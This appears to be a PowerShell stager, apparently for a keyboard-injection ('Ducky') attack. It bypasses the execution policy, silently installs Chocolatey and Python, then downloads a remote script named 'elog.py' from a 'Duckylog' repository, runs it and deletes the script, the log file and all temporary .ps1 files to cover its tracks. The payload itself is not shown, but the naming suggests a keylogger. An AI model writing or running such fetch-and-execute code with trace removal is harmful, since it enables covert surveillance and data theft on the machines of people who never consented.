# Function to clean up PowerShell scripts in the temp directory
function Cleanup-TempScripts {
    Get-ChildItem -Path ([System.IO.Path]::GetTempPath()) -Filter "*.ps1" -File | Remove-Item -Force
}

# Trap to handle script termination and perform cleanup
trap { Cleanup-TempScripts; break }

# Check if Python is installed
if (-Not (Get-Command python -ErrorAction SilentlyContinue)) {
    Write-Output "Python is not installed. Installing Python using Chocolatey..."

    # Install Chocolatey if it is not installed
    if (-Not (Get-Command choco -ErrorAction SilentlyContinue)) {
        Set-ExecutionPolicy Bypass -Scope Process -Force
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
        Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
    }

    # Install Python using Chocolatey
    choco install python -y
    $env:Path += ";$env:ProgramFiles\Python39\Scripts;$env:ProgramFiles\Python39"
}

$pythonScriptUrl = "https://raw.githubusercontent.com/Mocipie/Duckylog/main/elog.py"
$localPythonScriptPath = "$env:TEMP\elog.py"
$logFilePath = "$env:TEMP\log.txt"

if (-Not (Test-Path $logFilePath)) { New-Item -Path $logFilePath -ItemType File }

try {
    Invoke-WebRequest -Uri $pythonScriptUrl -OutFile $localPythonScriptPath
    $pythonProcess = Start-Process -FilePath "python" -ArgumentList $localPythonScriptPath -NoNewWindow -PassThru
    $pythonProcess.WaitForExit()
}
finally {
    if (Test-Path $logFilePath) { Remove-Item -Path $logFilePath }
    if (Test-Path $localPythonScriptPath) { Remove-Item -Path $localPythonScriptPath }
    Cleanup-TempScripts
}

# Ensure the script terminates last
Start-Sleep -Seconds 2
Write-Output "Cleanup completed. Exiting PowerShell script."

# Exit the PowerShell session
exit